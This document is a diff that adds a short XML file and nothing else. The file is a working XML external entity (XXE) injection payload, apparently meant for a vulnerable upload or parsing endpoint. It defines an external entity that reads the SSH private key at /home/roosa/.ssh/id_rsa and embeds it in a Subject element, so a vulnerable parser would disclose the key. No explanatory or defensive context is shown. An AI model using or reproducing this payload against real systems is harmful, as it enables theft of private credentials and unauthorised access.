@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/roosa/.ssh/id_rsa'>]>
+<Author>
+  <Subject>&test;</Subject>
+  <Content>content</Content>
+</Author>
